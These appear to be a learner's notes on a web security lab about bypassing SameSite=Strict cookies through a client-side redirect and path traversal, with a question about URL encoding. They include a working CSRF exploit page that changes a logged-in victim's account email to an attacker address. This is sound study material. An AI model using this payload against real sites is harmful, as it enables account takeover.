## Lab: SameSite Strict bypass via client-side redirect

Defense:
- SameSite: Strict

Bypass:
- Find a client redirect, with controllable redirect URL
- path traversal contructs redirect URL


Question:
- in the redirect URL, the submit parameter, the & char does not work, but %26 (ASCII of &) works, why?

```
<html>
    <body>
        <script>
            document.location = "https://0ad700d60490926080c4064d00c100a4.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwne123d3%2540evil-user.net%26submit=1"
        </script>
    </body>
</html>
```
